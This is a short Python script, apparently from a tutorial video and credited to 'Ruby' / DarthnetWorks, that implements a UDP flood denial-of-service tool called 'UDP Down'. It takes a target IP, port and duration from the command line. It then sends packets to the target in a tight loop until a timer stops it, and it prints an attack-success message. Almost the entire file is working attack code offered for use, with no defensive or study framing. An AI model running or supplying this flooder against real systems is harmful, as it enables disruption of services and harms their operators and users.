import sys
import socket
import threading
from colorama import Fore
import requests
#DarthnetWorks

#Welcome in the new video for create script ddos UDP in python

def ddos():
	global on
	on = False




def ascii():
	banner = """
  _    _ _____  _____        _                     
 | |  | |  __ \|  __ \      | |                    
 | |  | | |  | | |__) |   __| | _____      ___ __  
 | |  | | |  | |  ___/   / _` |/ _ \ \ /\ / / '_ \ 
 | |__| | |__| | |      | (_| | (_) \ V  V /| | | |
  \____/|_____/|_|       \__,_|\___/ \_/\_/ |_| |_|
                                                   
    """

	return banner		


def Copy():
	print("Script dev by: Ruby")
	print("Script name: UDP Down")


def rules():
	print("[ script.py -i <ip> -p <port> -t <time> ]")



#command: script.py -i <ip> -p <port> -t <time>



if(len(sys.argv) == 7):
	if(sys.argv[1] == "-i" and sys.argv[3] == "-p" and sys.argv[5] == "-t"):
		print(ascii())
		print("\n")

		Copy()
		print("\n")

		rules()



		ip = sys.argv[2]
		port = int(sys.argv[4])
		time = int(sys.argv[6])
		print("\n")
		print("Attack send with success: {} in port {} with method UDP timer: {}".format(ip, port, time))


		udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		on = True

		timer = threading.Timer(time, ddos)

		timer.start()

		while on == True:
			udp.sendto(b"DarthnetWorks", (ip, port))


	else:
		print("Command: script.py -i <ip> -p <port> -t <time>")

else:
	print("Command: script.py -i <ip> -p <port> -t <time>")

